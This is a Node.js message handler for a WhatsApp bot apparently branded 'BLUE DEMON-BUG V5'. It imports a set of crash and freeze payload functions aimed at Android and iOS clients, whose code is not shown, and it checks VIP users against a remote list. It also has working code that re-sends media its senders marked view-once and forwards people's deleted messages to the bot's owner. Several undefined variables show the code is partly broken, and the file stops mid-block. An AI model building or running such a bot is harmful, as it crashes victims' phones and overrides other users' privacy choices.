const chalk = require('chalk')
const pino = require('pino')
const fs = require("fs")
const {Sticker, StickerTypes } = require('wa-sticker-formatter')
const moment = require("moment-timezone");
const util = require("util");
const crypto = require("crypto")
const { exec, spawn, execSync } = require("child_process")
const axios = require("axios");
const yts = require("yt-search");
const speed = require("performance-now");
const ms = require("parse-ms");
const os = require('os');
const { join, dirname } = require('path');
const path = require('path');
const { performance } = require('perf_hooks')
const fetch = require('node-fetch');
const request = require("request")
const { userXp, userLeveling } = require("../lib/user");
const {msgFilter, addSpam, SpamExpired, cekSpam } = require('../lib/antispam')
const { color } = require('../lib/color')
const { toFirstCase, isNumber, pickRandom, generateProfilePicture, listCase, runtime, makeid, isUrl, fetchJson, sleep, getBuffer } = require("../lib/myfunc");
const ephoto = require('../lib/scraper')
const addblockcmd = require("../lib/blockcmd");
const { Failed, Succes, checkDataId } = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const {
    jadibot,
    stopjadibot,
    listjadibot
} = require('../lib/jadibot.js')
const {
    bad
} = require('../message/messages')
const { vnMenu, images, zoroimages } = require('../temp/media/links.js')
const {
    virtex
} = require('../database/virtex/virtex.js')
//database 
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard
const anonChat = db.data.anonymous
const allcommand = db.data.allcommand
const sewa = db.data.sewa
const spammer = []
//=================================================//

module.exports = async (conn, dev, chatUpdate, store) => {
    //console.log(chatUpdate.messages)
    var multi = db.data.settings['settingbot'].multi
    const m = dev
    var Ownerin = "000@s.whatsapp.net"
    const Tnow = (new Date() / 1000).toFixed(0)
    const seli = Tnow - m.messageTimestamp.low
    if (seli > Intervalmsg) return console.log((`Message ${Intervalmsg} seconds ago ignored to avoid spamming`))
    try {
 const { type, now,  args, sender, fromMe, from, botNumber,
 senderNumber, groupName, groupId, groupMembers, groupDesc, groupOwner, pushname, itsMe, mentionByTag, mentionByReply, users, budy, content, body } = dev

 const isGroup = m.key.remoteJid.endsWith('@g.us');
        ///_&-
const prefixFile = './database/prefix.json';
let prefix = '.';
if (fs.existsSync(prefixFile)) {
    try {
        const data = JSON.parse(fs.readFileSync(prefixFile, 'utf8'));
        if (data.prefix) prefix = data.prefix;
    } catch (error) {
        console.error('Error loading prefix:', error);
    }
}
       var ownerNumber = [`${botNumber}@s.whatsapp.net`, `2347041039367@s.whatsapp.net`, `${conn.user.jid}`]
const ownerFile = './database/owner.json';
let ownerList = [];
if (fs.existsSync(ownerFile)) {
    try {
        ownerList = JSON.parse(fs.readFileSync(ownerFile, 'utf8'));
    } catch (error) {
        console.error('Error loading owner list:', error);
    }
}
const isOwner = ownerNumber.includes(sender) || ownerList.includes(sender) || checkDataId("owner", sender, DataId);
        const isCmd = body.startsWith(prefix)
        const isCommand = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ""
        const isCommandx = body.startsWith(prefix) 
    ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
    : body.trim().split(/ +/).shift().toLowerCase();
        const q = args.join(' ')
        const timeWib = moment().tz('Africa/Lagos').format('HH:mm:ss')
        const text = args.join(' ')
        const command = (_prem || isOwner) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
        const theOwner = sender == Ownerin
        const timestampp = speed();
        const latensi = speed() - timestampp
        const quoted = dev.quoted ? dev.quoted : dev
        const mime = (quoted.msg || quoted).mimetype || ''
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
        const Input = (mentionByTag && mentionByTag[0]) ? mentionByTag[0] :
            (mentionByReply || q ? numberQuery : false);
   let publik = true 
        const replyCommand = isCmd ? isCmd : allcommand.includes(toFirstCase(command))
        const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
        const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url ||
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url || // To handle documents without captions
            m.message.audioMessage?.url || // To handle audio messages
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude || // To handle location messages
            m.message.pollCreationMessage?.name || // To handle poll messages
            '';
        const user = global.db.data.users[m.sender]
        const chat = isGroup ? global.db.data.chats[m.chat] : false
        const kickon = global.db.data.kickon[m.chat]
        const botRun = global.db.data.others['runtime']
        const botTime = (new Date - botRun.runtime) || "Not detected"
        const runTime = clockString(botTime)

        const {
            beta1,
            beta2,
            buk1
        } = require("../lib/hdr.js")

        if (global.autoReadChat === true && isMessage) {
            await conn.readMessages([m.key])
        }
        if (global.autotyping === true) {
            conn.sendPresenceUpdate('composing', from)
        }
        if (global.alwaysonline === true) {
            conn.sendPresenceUpdate('available', from);
        }
        //Waktu
        let d = new Date
        let locale = 'en'
        let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
        let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
        let week = d.toLocaleDateString(locale, {
            weekday: 'long'
        })
        const calender = d.toLocaleDateString("en", {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        })
       function clockString(ms) {
            let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
            let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
            let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
            let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
            var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " hari, ") : "";
            var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " jam, ") : "";
            var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " menit, ") : "";
            var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " detik") : "";
            let time = d > 0 ? dDisplay + hDisplay + mDisplay + sDisplay : hDisplay + mDisplay + sDisplay
            return time
        }
        if (isGroup && chat) {
            if (!('name' in chat)) chat.name = groupNmae
            if (!isNumber(chat.add)) chat.add = 0
            if (!('welcome' in chat)) chat.welcome = false
            if (!('detect' in chat)) chat.detect = true
            if (!('sWelcome' in chat)) chat.sWelcome = ''
            if (!('sBye' in chat)) chat.sBye = ''
            if (!('sPromote' in chat)) chat.sPromote = ''
            if (!('sDemote' in chat)) chat.sDemote = ''
            if (!('desc' in chat)) chat.desc = true
            if (!('descUpdate' in chat)) chat.descUpdate = true
            if (!('stiker' in chat)) chat.stiker = false
            if (!("antibot" in chat)) chat.antibot = false
            if (!('antiimage' in chat)) chat.antiimage = false
            if (!('antisticker' in chat)) chat.antisticker = false
            if (!('antivideo' in chat)) chat.antivideo = false;
            if (!('antiaudio' in chat)) chat.antiaudio = false;
            if (!('antiLink' in chat)) chat.antiLink = false
            if (!isNumber(chat.expired)) chat.expired = 0
            if (!('antiBadword' in chat)) chat.antiBadword = true
            if (!('antispam' in chat)) chat.antispam = true
            if (!('antitroli' in chat)) chat.antitroli = false
            if (!('antivirtex' in chat)) chat.antivirtex = true
            if (!('antiwame' in chat)) chat.antiwame = false
            if (!('antitoxic' in chat)) chat.antitoxic = false
            if (!('viewonce' in chat)) chat.viewonce = true
            if (!('nsfw' in chat)) chat.nsfw = false
            if (!("rpg" in chat)) chat.rpg = false;
            if (!('clear' in chat)) chat.clear = false
            if (!isNumber(chat.cleartime)) chat.clearTime = 0
        } else if (isGroup) global.db.data.chats[m.chat] = {
            name: groupName,
            add: 0,
            welcome: false,
            detect: false,
            sWelcome: '',
            sBye: '',
            sPromote: '',
            sDemote: '',
            desc: true,
            descUpdate: true,
            antibot: false,
            antiimage: false,
            antisticker: false,
            antiaudio: false,
            antivideo: false,
            autostiker: false,
            antilink: false,
            antilinkgc: false,
            antidelete: false,
            antiasing: false,
            banchat: false,
            expired: 0,
            antibadword: false,
            antispam: true,
            antitroli: false,
            antivirtex: false,
            antitoxic: false,
            antipromosi: false,
            antihidetag: false,
            viewonce: false,
            nsfw: false,
            rpg: false,
            clear: false,
            clearTime: 0
        }
        const settings = global.db.data.settings['settingbot']
        if (settings) {

            //Auto set
            if (!isNumber(settings.status)) setting.status = new Date() * 1
            if (!('setmenu' in settings)) settings.setmenu = "document"
            if (!('docType' in settings)) settings.docType = "docx"
            if (!('Qoted' in settings)) settings.Qoted = "ftoko"
            if (!('autoBio' in settings)) settings.autoBio = true
            if (!('multi' in settings)) settings.multi = true
            if (!('prefix' in settings)) settings.prefix = "!"
            if (!('fake' in settings)) settings.fake = botName
            if (!('autoblockcmd' in settings)) settings.autoblockcmd = false
            if (!('fake1' in settings)) settings.fake1 = "EhzStore"
            if (!('replyType' in settings)) settings.replyType = "web"
            if (!('setwelcome' in settings)) settings.setwelcome = "type11"
            if (!('autoReport' in settings)) settings.autoReport = true
            if (!('autoLevel' in settings)) settings.autoLevel = true
            if (!('autoSticker' in settings)) settings.autoSticker = false
            if (!('publik' in settings)) settings.publik = true

        } else {
            global.db.data.settings['settingbot'] = {
                status: new Date() * 1,
                setmenu: "document",
                docType: "docx",
                Qoted: "ftoko",
                autoBio: true,
                multi: true,
                prefix: "!",
                fake: botName,
                autoblockcmd: false,
                replyType: "web",
                setwelcome: "type11",
                autoReport: true,
                autoLevel: true,
                autoSticker: false,
                publik: true
            }
        }
        const {
            downloadContentFromMessage,
            generateWAMessageFromContent,
            getDevice,
            proto,
            generateWAMessageContent
        } = require("@whiskeysockets/baileys")
        async function createImage(url) {
            const {
                imageMessage
            } = await generateWAMessageContent({
                image: {
                    url
                }
            }, {
                upload: conn.waUploadToServer
            });
            return imageMessage;
        }

        //Security / Keamanan
        const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const isGroupOwner = isGroup ? groupMetadata.owner : ''
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isAntiLink = isGroup ? db.data.chats[from].antilink : false
        const isWelcome = isGroup ? db.data.chats[from].welcome : true
        const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
        const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
        const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
        const isAntiToxic = isGroup ? db.data.chats[from].antitoxic : false
        const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
        const isAntiViewOnce = isGroup ? db.data.chats[from].viewonce : false
        const isAntiBot = isGroup ? db.data.chats[from].antibot : false
        const isAntiNsfw = isGroup ? db.data.chats[from].nsfw : false
        const thumb = fs.readFileSync('./temp/blueimages/thumb.jpg')

        //User 
        const userLevel = user ? db.data.users[m.sender].level : true
        const userExp = user ? db.data.users[m.sender].exp : true
        const userId = user ? db.data.users[m.sender].id : true
        const amountExp = Math.floor(Math.random() * 10) + 50
        const requiredExp = 10000 * userLevel
        const userPersen = userExp / requiredExp * 100
        const userVerified = user ? db.data.users[m.sender].date : true

        //Ucapan Waktu  
        if (timeWib < "23:59:00") {
            var ucapanWaktu = '𝙾𝚁𝙴𝚆𝙰𓃵'
        }
        if (timeWib < "19:00:00") {
            var ucapanWaktu = '𝙾𝚁𝙴𝚆𝙰𓃵'
        }
        if (timeWib < "18:00:00") {
            var ucapanWaktu = '𝙾𝚁𝙴𝚆𝙰𓃵'
        }
        if (timeWib < "15:00:00") {
            var ucapanWaktu = '𝙾𝚁𝙴𝚆𝙰𓃵'
        }
        if (timeWib < "11:00:00") {
            var ucapanWaktu = '𝙾𝚁𝙴𝚆𝙰𓃵'
        }
        if (timeWib < "06:00:00") {
            var ucapanWaktu = '𝙾𝚁𝙴𝚆𝙰𓃵'
        }
        conn.sendPresenceUpdate('unavailable', from);

        const isImage = (type === 'imageMessage')
        const isVideo = (type === 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'conversation')
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isViewOnce = (type == 'viewOnceMessageV')
        const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
        const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
        const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const pesilit = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesD = pesilit.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pesilit.slice(0).trim()
 const logMessage = (type, colorCode, timestamp, content, sender, group = null) => {
    let log = color(`[${type}]`, colorCode) + 
              color(` [${timestamp}]`, "green") + 
              color(` ${content}`, "cyan") + 
              color(` from`, "gold") + 
              color(` ${sender}`, "orange");
    
    if (group) log += color(` in group`, "purple") + color(` ${group}`, "deeppink");
    console.log(log);
};
const reply = async (teks) => {
    conn.sendMessage(from, { text: fontx(`${teks}\n> ${caption}`) });
};
const replyx = async (teks) => {
    conn.sendMessage(from, { text: teks });
};
const timestamp = moment.tz('Africa/Lagos').format('HH:mm');

if (!isGroup && !isCmd) {
    logMessage("PRIVATE", "greenyellow", timestamp, budy, pushname);
}

if (isGroup && !isCmd) {
    logMessage("GROUP", "gold", timestamp, budy, pushname, groupName);
}

if (!isGroup && isCmd) {
    logMessage("CMD", "blue", timestamp, `${command} [${args.length}]`, pushname);
}

if (isGroup && isCmd) {
    logMessage("CMD", "blue", timestamp, `${command} [${args.length}]`, pushname, groupName);
}

        // Pengubah teks
        const fontx = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var ehz = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
            var replacer = [];
            abc.map((v, i) =>
                replacer.push({
                    original: v,
                    convert: ehz[style].split('')[i]
                })
            );
            var str = text.toLowerCase().split('');
            var output = [];
            str.map((v) => {
                const find = replacer.find((x) => x.original == v);
                find ? output.push(find.convert) : output.push(v);
            });
            return output.join('');
        };
        //×××××××××××××××××××××××××//
        let listRespon = global.db.data.respon[body]
        if (listRespon) m.reply(listRespon.respon)

        //FAKE REPLY  
        const ments = (teks) => {
            return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]
        }

        const fcall = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            'message': {
                extendedTextMessage: {
                    text: body
                }
            }
        }
        const ehan = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;menhera,;;;\nFN: ehanz Ai\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': null,
                    thumbnail: null,
                    sendEphemeral: true
                }
            }
        }
        const ftoko = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "16505434800@s.whatsapp.net"
                } : {})
            },
            message: {
                "productMessage": {
                    "product": {
                        "productImage": {
                            "mimetype": "image/jpeg",
                            "jpegThumbnail": fs.readFileSync('./temp/blueimages/thumb.jpg')
                        },
                        "title": `${pushname}`,
                        "description": `${ucapanWaktu} kak`,
                        "currencyCode": "IDR",
                        "priceAmount1000": `${pushname}`,
                        "retailerId": `Rp10`,
                        "productImageCount": 1
                    },
                    "businessOwnerJid": `0@s.whatsapp.net`
                }
            }
        }
        //Message
        require("./message.js")(senderNumber, prefix, command, reply)
        // Custom reply function
        const sendvn = (teks) => {
            conn.sendMessage(from, {
                audio: {
                    url: teks
                },
                ptt: true,
                waveform: [0, 0, 50, 0, 0, 0, 10, 80, 10, 60, 10, 99, 60, 30, 10, 0, 0, 0],
                mimetype: 'audio/mpeg'
            }, {
                quoted: m
            })
        }
        const sendSticker = (teks) => {
            conn.sendMessage(from, {
                sticker: {
                    url: teks
                }
            }, {
                quoted: m
            })
        }
        const pickRandom = (arr) => {
            return arr[Math.floor(Math.random() * arr.length)]
        }
  const vnme = vnMenu
const dmusic = vnme[Math.floor(Math.random() * vnme.length)]
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? conn.sendMessage(from, {
                text: teks,
                mentions: memberr,
                contextInfo: {
                    "mentionedJid": memberr
                }
            }): conn.sendMessage(from, {
                mentions: memberr,
                text: teks,
                contextInfo: {
                    "mentionedJid": memberr
                }
            }, {
                quoted: dev
            })
        }
        //××××××××××××××××{××××//
        const addSpammer = function(jid, _db) {
            let position = false
            Object.keys(_db).forEach((i) => {
                if (_db[i].id === jid) {
                    position = i
                }
            })
            if (position !== false) {
                _db[position].spam += 1
            } else {
                let bulin = ({
                    id: jid,
                    spam: 1
                })
                _db.push(bulin)
            }
        }

        const FinisHim = async function(jid, _db) {
            let position = false
            Object.keys(_db).forEach((i) => {
                if (_db[i].id === jid) {
                    position = i
                }
            })
            if (position !== false) {
                if (_db[position].spam > 7) {
                    if (db.data.users[sender].banned.status || !isOwner) {
                        return
                    }
                    let obj = {
                        id: senderNumber,
                        status: true,
                        date: calender,
                        reason: "Spam Bot"
                    }
                    db.data.users[woke].banned = obj
                    console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
                    reply("Kamu telah di banned karena telah melakukan spam")
                }
            } else {
                console.log(`Spam ke ${_db[position].spam}`)
            }
        }
        //System Expired
        _sewa.expiredCheck(conn, sewa)
        _prem.expiredCheck(premium)

        //ANTI SPAM BERAKHIR
        if (SpamExpired(senderNumber, "Case", AntiSpam)) {
            let position = false
            for (let i of spammer) {
                if (i.id == senderNumber) {
                    position = i
                }
            }

            if (position !== false) {
                spammer.splice(position, 1)
                console.log(chalk.bgGreen(color("[  Remove ]", "black")), "Sukses remove spammer")
            }
        }


        SpamExpired(senderNumber, "NotCase", AntiSpam)
        if (isCmd && cekSpam("Case", senderNumber, AntiSpam)) {
            addSpammer(senderNumber, spammer)
            FinisHim(senderNumber, spammer)
            console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")), "antispam Case aktif")
            return
        }

        //ANTI SPAM PRIVATE CHAT
        if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner) {
            addSpam("Case", senderNumber, "5s", AntiSpam)
            addSpammer(senderNumber, spammer)
            return reply("`YOO,STOP SPAMMING CMD`")
        }

        //ANTI SPAM GROUP CHAT     
        if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
            addSpam("Case", senderNumber, "10s", AntiSpam)
            addSpammer(senderNumber, spammer)
            return reply("`YOO,STOP SPAMMING CMD`")
        }
        if (isCmd && !isOwner) msgFilter.addFilter(from)
        // This case was invented by BLUE DEMON
        if (global.autoreact && isMessage) {
            try {
                // Define an array of emojis
const emojis = [
    "😊", "👍", "😂", "🥶", "😵",
    "😘", "😑", "😤", "😍", "😎", 
    "😋", "🤗", "🥰", "😜", "😌", 
    "😬", "🙃", "😈", "😏", "🥳", 
    "🤩", "😅", "🤭", "😷", "😴", 
    "🤔", "😮", "😬", "😪", "😅", 
    "😓", "😤", "🥺", "🤐", "😔", 
    "😞", "😳", "😜", "😝", "🥶", 
    "😇", "🙄", "😡", "😬", "🤧", 
    "😩", "😏", "😶", "😳", "😋", 
    "😌", "😆", "🤭", "🤩", "😺",
    "😶‍🌫️", "😤", "🤯", "😱", "🥵", 
    "😶", "😕", "🤑", "🤒", "🤧", 
    "🤮", "🤫", "🥸", "😧", "😞",
    "🫣", "🥱", "🤐", "😮‍💨", "🤠"
];
                // Function to pick a random emoji
                const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];

                // Ensure the message has a valid key before sending a reaction
                if (m.key && m.key.remoteJid && m.key.id) {
                    const randomEmoji = getRandomEmoji();

                    // Send the reaction
                    await conn.sendMessage(m.chat, {
                        react: {
                            text: randomEmoji,
                            key: m.key
                        }
                    });
                }
            } catch (error) {
                // Handle errors and log them for debugging
                console.error("Error in AutoReact:", error.message || error);
            }
        }
        async function bluedemon(m) {
    try {
        const jsonUrl = `https://huggingface.co/spaces/API-X/BOT-BASE/resolve/main/BUG.json`;
        const response = await axios.get(jsonUrl);
        const { authorizedNumbers, public: isPublic } = response.data;

        if (isPublic) {
            return true; // If public mode is enabled, allow everyone to use it
        }

        const userPhone = m.sender;
        const isVip = authorizedNumbers.includes(userPhone);

        return isVip; // Return true if the user is authorized
    } catch (error) {
        console.error('Error fetching authorized numbers:', error);
        await conn.sendMessage(m.chat, {
            text: '🚫 Unable to access the server at this time. Please try again later.'
        });
        return false;
    }
}
const isVip = await bluedemon(m);
        const { crashcursor, InfiNite, freezefile, buginvite, crashUiV5, systemUi, systemUi2, crashui2, sendOfferCall, InVisiLoc, bugnew, XeonXRobust, Fuckui,InvisibleLoadFast, mati2, hardfreeze, betacrash, UpiCrash, VenCrash, AppXCrash, SmCrash, FBiphone, QXIphone, caywzzaja_notif, QPayIos, XeonIosOld, XeonIosPayOld, XeonIosNew, QPayStriep, QDIphone, IosMJ, XiosVirus } = require('../lib/demon.js')
  if (!settings.publik && !isOwner) return; 
        //AUTO BIO BOT
        if (settings) {} else global.db.data.settings['settingbot'] = {
            status: new Date() * 1,
        }
        if ((new Date() * 1 - settings.status > 2000) && settings && settings.autoBio) {
            let data = global.db.data.others['runtime']
            let time = (new Date - data.runtime)
            let bio = `🕸️𝐁𝐋𝐔𝐄 𝐃𝐄𝐌𝐎𝐍-𝐁𝐔𝐆 𝐕𝟓🕸️\n🕸️𝐕𝐈𝐏 𝐔𝐒𝐄𝐑 ${isVip ? '𝐓𝐑𝐔𝐄' : '𝐅𝐀𝐋𝐒𝐄'}`
            await conn.updateProfileStatus(bio).catch(_ => _)
            settings.status = new Date() * 1
        }
        // Function Loading 
        async function loading() {
            let emotLoad = [`${themeemoji}`]
            await conn.sendMessage(from, {
                react: {
                    text: emotLoad,
                    key: m.key
                }
            })
        }
        async function loadingx() {
            let emotLoaderr = ["💀"]
            await conn.sendMessage(from, {
                react: {
                    text: emotLoaderr,
                    key: m.key
                }
            })
        }
        async function killing() {
            let emotLoad = [`😈`]
            await conn.sendMessage(from, {
                react: {
                    text: emotLoad,
                    key: m.key
                }
            })
        }

async function autoViewStatus() {
    try {
        if (global.autoswview === true) {
            let statusList = await conn.fetchStatusUpdates();
            for (let status of statusList) {
                await conn.readStatus(status.id);
            }
        }
    } catch (err) {
        console.error("Error in autoViewStatus:", err);
    }
}

        //-------------------- 》SECURITY《 ------------------\\
        //ANTI VIEWONCE 
        if ((type == 'viewOnceMessage' || isQuotedViewOnce) && (isAntiViewOnce || budy.startsWith("Readviewonce"))) {
            const {
                downloadContentFromMessage
            } = (await import('@whiskeysockets/baileys')).default
            if (isQuotedViewOnce) {
                var view = m.quoted.message
            } else {
                var view = m.message.viewOnceMessage.message
            }

            let Type = Object.keys(view)[0]
            let media = await downloadContentFromMessage(view[Type], Type == 'imageMessage' ? 'image' : 'video')
            let buffer = Buffer.from([])
            for await (const chunk of media) {
                buffer = Buffer.concat([buffer, chunk])
            }
            if (/video/.test(Type)) {
                conn.sendFile(m.chat, buffer, 'media.mp4', view[Type].caption || '', m)
            } else if (/image/.test(Type)) {
                conn.sendFile(m.chat, buffer, 'media.jpg', view[Type].caption || '', m)
            }
        }
        
/*==========ANTILINK=========*/        
 if (isGroup && isAntiLink) {
    if (budy.includes(`https:`)) {
        if (isGroupAdmins) return reply(`*「 LINK DETECTED 」*\n> *GROUP ADMINS ARE EXCEPTIONAL*`)
        if (ownerNumber.includes(sender)) return reply(`*「 LINK DETECTED 」*`)
        let linkgc = await conn.groupInviteCode(from)
        if (budy.includes(`${linkgc}`)) return reply(`*「 GROUP LINK DETECTED 」*\n> *Almost kicked you ✌️*`)
        if (budy.includes('blue') || budy.includes('admin')) return reply('*「 GROUP LINK DETECTED 」*\nADMIN PERMISSION RECEIVED')
        reply(` *「 LINK DETECTED 」*\n> You sent a link, sorry you were kicked from the group`)
        setTimeout(() => {
            if (isBotGroupAdmins) conn.sendMessage(from, {
                delete: m.key
            })
            conn.groupParticipantsUpdate(from, [sender], 'remove').catch((e) => {
                reply(`BOT MUST BE ADMIN`)
            })
        }, 2000)
    }
}
/*==========ANTILINK👆👆👆=========*/
if (type === 'protocolMessage' && global.antidelete) {
    let mess = chatUpdate.messages[0].message.protocolMessage;

    try {
        let chats = Object.entries(await conn.chats).find(([user, data]) => 
            data.messages && data.messages[mess.key.id]
        );

        if (chats && chats[1] !== undefined) {
            let msg = JSON.parse(JSON.stringify(chats[1].messages[mess.key.id]));
            let info = `🛑 *Deleted Message Detected*\n\n` +
                       `📍 *Chat/Group Name:* ${chats[1]?.metadata?.subject || "Private Chat"}\n` +
                       `👤 *Sender:* ${msg.pushName || "Unknown"}\n` +
   `> ${caption}`;
            await conn.sendMessage(botNumber, { text: info });
            await conn.copyNForward(botNumber, msg).catch(e => console.log(e, msg));
        }
    } catch (error) {
        console.error("Error handling anti-delete:", error);
    }
}
        //ANTI VIRUS
        if (isGroup && isAntiVirtex) {
